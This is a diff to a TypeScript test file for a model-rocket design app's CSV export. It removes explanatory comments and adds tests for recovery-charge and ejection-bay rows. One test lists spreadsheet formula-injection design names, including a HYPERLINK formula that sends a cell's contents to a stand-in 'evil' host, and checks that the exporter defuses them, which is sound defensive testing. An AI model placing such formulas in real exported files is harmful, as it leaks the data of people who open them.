@@ -10,8 +10,6 @@ import { NO_VALUE } from '../../../src/i18n/noValue';
 
 const info = {
   length: 0.9,
-  // Shorter than `length`, so 30.9 (the engine's figure) and 27.4 (the wrong
-  // (cp - cg) / length) are distinguishable in the assertion below.
   lengthAerodynamic: 0.8,
   refDiameter: 0.079,
   mass: 4.25,
@@ -83,8 +81,6 @@ describe('design CSV', () => {
   it('has the Rocket summary in the chosen units with dot decimals', () => {
     expect(rows).toContainEqual(['Rocket', 'Length', '90', 'cm']);
     expect(rows).toContainEqual(['Rocket', 'Stability (on pad)', '3.14', 'cal']);
-    // The kernel's own figure, over the aerodynamic length; (cp - cg) / length
-    // would be 27.4.
     expect(rows).toContainEqual(['Rocket', 'Stability (%)', '30.9', '%']);
     expect(rows).toContainEqual(['Rocket', 'CP', '162.9', 'cm']);
     expect(rows).toContainEqual(['Rocket', 'Normal-Force Slope (CNα)', '26.42', '/rad']);
@@ -95,7 +91,6 @@ describe('design CSV', () => {
       .trimEnd()
       .split('\r\n')
       .map((l) => l.split(','));
-    // 0.9 m = 35.4331 in to six significant figures; 4.25 kg = 149.914 oz.
     expect(imp).toContainEqual(['Rocket', 'Length', '35.4331', 'in']);
     expect(imp).toContainEqual(['Rocket', 'Mass (Loaded)', '149.914', 'oz']);
   });
@@ -115,9 +110,7 @@ describe('design CSV', () => {
     expect(c).toContain('Design,Name,"Big, Rocket",');
   });
 
-  // `model.name` is the <name> of an imported .ork, so it is untrusted: share
-  // someone a design and its name lands in a cell of the CSV they export.
-  // Excel and Sheets execute a cell that leads with = + - @.
+  // Security: `model.name` is from an imported .ork; spreadsheets execute a cell led by = + - @.
   it.each(['=HYPERLINK("http://evil/?"&A1,"Open")', '+1+1', '-1+1', '@SUM(A1)'])(
     'neutralizes a formula-triggering design name: %s',
     (name) => {
@@ -126,28 +119,15 @@ describe('design CSV', () => {
         .split('\r\n')
         .find((l) => l.startsWith('Design,Name,'))!
         .slice('Design,Name,'.length);
-      // Leads with an apostrophe, so the spreadsheet takes the cell as text.
-      // Quoting is separate and only kicks in for delimiters, so accept either
-      // `'=…` or `"'=…"`.
       expect(value.replace(/^"/, '').startsWith("'")).toBe(true);
     },
   );
 
   it('quotes a bare CR, which would otherwise split the record', () => {
-    // The file's own terminator is \r\n, so an unquoted lone \r reads as a row
-    // break to an RFC-4180 parser.
     const c = buildDesignCsv({ ...model, name: 'One\rTwo' }, METRIC_UNITS);
     expect(c).toContain('"One\rTwo"');
   });
 });
-
-/**
- * Every whole-rocket statistics table lists the same rows: the .ork
- * <designinfo> block, this CSV and the PDF. A finless design has no defined CP,
- * so OpenRocket omits CP, both stability rows and CNα, and a design with no
- * reference diameter has no fineness. The CSV omits the same rows, rather than
- * writing them (fineness as 0) where the .ork written beside it has none.
- */
 describe('design CSV rows for a finless design', () => {
   const finless = { ...info, cna: 0, refDiameter: 0 } as StaticInfo;
   const csv = buildDesignCsv({ ...model, whole: { label: 'F', info: finless }, stageSummaries: [] }, METRIC_UNITS);
@@ -224,9 +204,8 @@ describe('buildComponentCsv', () => {
     );
     const cells = nose!.split(',');
     expect(cells.slice(0, 5)).toEqual(['Sustainer', '0', 'Nose cone', 'Nose', 'Polystyrene']);
-    // A radius in the model is a diameter in the file: 12.5 mm is 2.5 cm across.
+    // A model radius is a diameter in the file.
     expect(Number(cells[9])).toBeCloseTo(2.5, 6);
-    // A figure the part does not have is blank.
     expect(cells[10]).toBe('');
   });
 
@@ -247,17 +226,12 @@ describe('buildComponentCsv', () => {
     expect(Number(cells[11])).toBeCloseTo(4, 6);
     expect(Number(cells[12])).toBeCloseTo(2.5, 6);
   });
-
-  /**
-   * Six significant figures, not a fixed count of decimals, which is wrong in
-   * one unit or another: three decimals write a 0.5 mm wall in meters as 0.001.
-   */
   it('keeps a thin wall in a large unit', () => {
     const cells = csv({ ...METRIC_UNITS, length: 'm' })[2]!.split(',');
     expect(cells[13]).toBe('0.0005');
   });
 
-  // A spreadsheet can read an exponent as text; `String` writes one below 1e-6.
+  // `String` writes an exponent below 1e-6, which a spreadsheet can read as text.
   it('writes a very small figure as a plain decimal', () => {
     const tiny: ReportModel = {
       ...parts,
@@ -271,12 +245,6 @@ describe('buildComponentCsv', () => {
       .split('\r\n');
     expect(row!.split(',').at(-1)).toBe('0.0000004');
   });
-
-  /**
-   * A chute's canopy and a shock cord's cord are a surface and a line material
-   * (the kernel's RecoveryDevice.getMaterial and ShockCord.getMaterial), so each
-   * density goes in the column of its own unit.
-   */
   it('writes a soft part density in the column of its kind', () => {
     const soft: ReportModel = {
       ...parts,
@@ -312,7 +280,6 @@ describe('buildComponentCsv', () => {
       .trimEnd()
       .split('\r\n')
       .map((r) => r.split(','));
-    // 0.067 kg/m² is 67 g/m²; 0.0018 kg/m is 1.8 g/m.
     expect(chute!.slice(4, 8)).toEqual(['Ripstop nylon', '', '67', '']);
     expect(cord!.slice(4, 8)).toEqual(['Elastic cord', '', '', '1.8']);
   });
@@ -383,12 +350,6 @@ describe('design CSV fin-set fields for unnamed fin sets', () => {
     }
   });
 });
-
-/**
- * A length in the report takes its decimals from its size in the unit shown,
- * as the app's own fields do: a BT-50 is 0.976 in across, which one decimal
- * would print as 1.0, and 24.8 mm needs no more than one.
- */
 describe('report lengths', () => {
   const page = (length: string) =>
     ({ t: i18n.getFixedT('en'), units: { ...METRIC_UNITS, length } }) as unknown as PdfPage;
@@ -396,5 +357,128 @@ describe('report lengths', () => {
   it('prints a BT-50 to the thousandth of an inch, and to the tenth of a millimeter', () => {
     expect(qv(page('in'), 'length', 0.02479)).toBe('0.976');
     expect(qv(page('mm'), 'length', 0.02479)).toBe('24.8');
+  });
+});
+
+describe('the design CSV recovery charges', () => {
+  it('writes each role primary, backup and bay, with a missing backup as a blank value', () => {
+    const csv = buildDesignCsv(
+      {
+        ...model,
+        charges: [
+          { role: 'drogue', tubeId: 'lower', tubeName: 'Lower', primaryKg: 0.0008, backupKg: null },
+          { role: 'main', tubeId: 'upper', tubeName: 'Upper', primaryKg: 0.0012, backupKg: 0.0018 },
+        ],
+      },
+      METRIC_UNITS,
+    );
+    const rows = csv.split('\r\n').filter((l) => l.startsWith('Recovery charges'));
+    expect(rows).toEqual([
+      'Recovery charges,Drogue charge,0.8,g',
+      'Recovery charges,Drogue backup charge,,g',
+      'Recovery charges,Drogue charge bay,Lower,',
+      'Recovery charges,Main charge,1.2,g',
+      'Recovery charges,Main backup charge,1.8,g',
+      'Recovery charges,Main charge bay,Upper,',
+    ]);
+  });
+
+  it('names the tube in each field when a role flies from two bays', () => {
+    const csv = buildDesignCsv(
+      {
+        ...model,
+        charges: [
+          { role: 'main', tubeId: 'a', tubeName: 'Upper', primaryKg: 0.004, backupKg: 0.0045 },
+          { role: 'main', tubeId: 'b', tubeName: 'Main', primaryKg: 0.005, backupKg: 0.0055 },
+        ],
+      },
+      METRIC_UNITS,
+    );
+    const rows = csv.split('\r\n').filter((l) => l.startsWith('Recovery charges'));
+    expect(rows).toEqual([
+      'Recovery charges,Main charge (Upper),4,g',
+      'Recovery charges,Main backup charge (Upper),4.5,g',
+      'Recovery charges,Main charge bay (Upper),Upper,',
+      'Recovery charges,Main charge (Main),5,g',
+      'Recovery charges,Main backup charge (Main),5.5,g',
+      'Recovery charges,Main charge bay (Main),Main,',
+    ]);
+  });
+
+  it('names the stage as well when the bays are in different stages', () => {
+    const csv = buildDesignCsv(
+      {
+        ...model,
+        charges: [
+          {
+            role: 'main',
+            tubeId: 'a',
+            tubeName: 'Body tube',
+            stageName: 'Sustainer',
+            primaryKg: 0.004,
+            backupKg: null,
+          },
+          { role: 'main', tubeId: 'b', tubeName: 'Body tube', stageName: 'Booster', primaryKg: 0.005, backupKg: null },
+        ],
+      },
+      METRIC_UNITS,
+    );
+    const rows = csv.split('\r\n').filter((l) => l.startsWith('Recovery charges,Main charge ('));
+    expect(rows).toEqual([
+      'Recovery charges,Main charge (Sustainer: Body tube),4,g',
+      'Recovery charges,Main charge (Booster: Body tube),5,g',
+    ]);
+  });
+
+  it('writes none for a design that saves none', () => {
+    expect(buildDesignCsv(model, METRIC_UNITS)).not.toContain('Recovery charges');
+  });
+});
+
+describe('the design CSV recovery bays', () => {
+  it("writes each bay's settings and its ground tests, oldest first", () => {
+    const bay = {
+      tubeId: 'lower',
+      tubeName: 'Lower',
+      role: 'drogue',
+      devices: ['Drogue'],
+      drawn: {
+        tubeId: 'lower',
+        tubeName: 'Lower',
+        boreM: 0.078,
+        lengthM: 0.3,
+        wholeTube: false,
+        pins: { count: 3, size: '2-56', forceN: 155.69, from: null },
+      },
+      record: {
+        flownTestId: 't2',
+        tests: [
+          { id: 't2', date: '2026-10-30', chargeKg: 0.0012, pins: null, result: 'clean', notes: 'Good' },
+          { id: 't1', date: '2026-10-29', chargeKg: 0.001, pins: null, result: 'none', notes: '' },
+        ],
+      },
+    } as never;
+    const rows = buildDesignCsv({ ...model, bays: [bay] }, METRIC_UNITS)
+      .split('\r\n')
+      .filter((l) => l.startsWith('Drogue bay'));
+    expect(rows).toEqual([
+      'Drogue bay,Tube,Lower,',
+      'Drogue bay,Bore,7.8,cm',
+      'Drogue bay,Length,30,cm',
+      'Drogue bay,Target pressure,1034.21,hPa',
+      'Drogue bay,Shear pins,3,',
+      'Drogue bay,Shear pin strength,155.69,N',
+      'Drogue bay,Test 1 date,2026-10-29,',
+      'Drogue bay,Test 1 charge,1,g',
+      'Drogue bay,Test 1 shear pins,0,',
+      'Drogue bay,Test 1 result,none,',
+      'Drogue bay,Test 1 notes,,',
+      'Drogue bay,Test 2 date,2026-10-30,',
+      'Drogue bay,Test 2 charge,1.2,g',
+      'Drogue bay,Test 2 shear pins,0,',
+      'Drogue bay,Test 2 result,clean,',
+      'Drogue bay,Test 2 notes,Good,',
+      'Drogue bay,Test 2 flown,yes,',
+    ]);
   });
 });
